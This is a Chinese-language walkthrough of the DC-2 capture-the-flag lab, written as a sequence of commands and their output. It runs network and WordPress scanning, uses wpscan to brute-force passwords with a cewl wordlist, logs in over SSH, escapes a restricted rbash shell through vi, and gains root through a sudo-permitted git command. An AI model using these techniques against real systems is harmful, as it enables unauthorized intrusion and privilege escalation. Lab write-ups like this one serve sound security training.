# DC-2

### 目标探测

使用arp扫描一下靶机目标

```
┌──(root㉿kali)-[~/Desktop/test]
└─# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:f5:d6:36, IPv4: 192.168.5.134
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.5.1     00:50:56:c0:00:08       VMware, Inc.
192.168.5.2     00:50:56:f6:37:b9       VMware, Inc.
192.168.5.138   00:0c:29:9b:2a:1c       VMware, Inc.
192.168.5.254   00:50:56:fc:0f:b8       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.936 seconds (132.23 hosts/sec). 5 responded
```

Nmap扫描一下目标开放端口

```
┌──(root㉿kali)-[~/Desktop/test]
└─# nmap -sS -sV -p- -T4 192.168.5.138
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-14 02:10 EST
Nmap scan report for dc-2 (192.168.5.138)
Host is up (0.00085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
MAC Address: 00:0C:29:9B:2A:1C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
```

可用看到开放了两个端口80 web 和7744 ssh，我们访问一下80，IP访问跳转到了域名 我们将它加入到/etc/hosts文件当中

```
┌──(root㉿kali)-[~/Desktop/test]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
192.168.5.138   dc-2

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
```

可用看到这是一个wordpass网站吗，这个flag提供给我们的信息让我们用cewl生成密码用来登录一个用户

<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

我们先用nikto扫描一下看看有没有扫描有用的信息

```
┌──(root㉿kali)-[~/Desktop/test]
└─# nikto -host http://dc-2/
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.5.138
+ Target Hostname:    dc-2
+ Target Port:        80
+ Start Time:         2023-12-14 02:23:26 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal Link header found with value: ARRAY(0x562441ddf150). See: https://www.drupal.org/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login.php: Wordpress login found.
+ 7850 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-12-14 02:24:06 (GMT-5) (40 seconds)
```

这里有一个wordpass的登录页面，接下来我们用wpscan枚举一下它的用户名

```
┌──(root㉿kali)-[~/Desktop/test]
└─# wpscan --url http://dc-2/ --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

这里枚举出来了三个用户名，接下来我们用cewl来生成密码，记得将用户名也保存到单独的txt文件当中

```
┌──(root㉿kali)-[~/Desktop/test]
└─# cewl -w dc-2.txt -d 5 -m 4 http://dc-2/       
CeWL 6.1 (Max Length) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

开始用wpscan 爆破密码

```
┌──(root㉿kali)-[~/Desktop/test]
└─# wpscan --url http://dc-2/ -U dc.txt -P dc-2.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```

得到了两个账号，我们先用jerry这个用户登录一下wordpass

<figure><img src="../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

这里告诉我们，如果无法在这里拿到shell，我们得尝试一下其它方法去，我们尝试ssh登录一下

```
┌──(root㉿kali)-[~/Desktop/test]
└─# ssh jerry@192.168.5.138 -p7744      
jerry@192.168.5.138's password: 
Permission denied, please try again.

┌──(root㉿kali)-[~/Desktop/test]
└─# ssh tom@192.168.5.138 -p7744
tom@192.168.5.138's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Dec 14 09:58:41 2023 from 192.168.5.134
tom@DC-2:~$
```

tom这个用户可用成功登录



### 权限提升

\
`rbash` 是 Bash shell 的一种限制模式。在这个模式下，用户受到一些额外的限制，使其只能执行有限的操作，从而提高系统的安全性。

```
tom@DC-2:~$ id
-rbash: id: command not found
```

在网上查找了一下这个绕过的方法

在命令行中，输入 vi，在末行模式中依次输入以下两条内容

```
:set shell=/bin/bash

:shell
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

再配置一下环境变量就可以绕过shell了

```
tom@DC-2:~$ export PATH=/usr/sbin:/usr/bin:/sbin:/bin
tom@DC-2:~$ id
uid=1001(tom) gid=1001(tom) groups=1001(tom)
```

我们查看一下有没有以root用户正在运行的命令，tom这个用户似乎不能执行这个命令，我们su切换到jerry这个用户

```
tom@DC-2:~$ sudo -l
[sudo] password for tom: 
Sorry, user tom may not run sudo on DC-2.
tom@DC-2:~$ su jerry
Password: 
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
jerry@DC-2:/home/tom$
```

可以看到git这个命令是以root权限运行的我们，通过搜索该提权方式可以利用以下命令提权

```
jerry@DC-2:/home/tom$ sudo git help status

!/bin/bash
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

这样就获得了一个root权限的shell

```
jerry@DC-2:/home/tom$ sudo git help status
root@DC-2:/home/tom# id
uid=0(root) gid=0(root) groups=0(root)
```
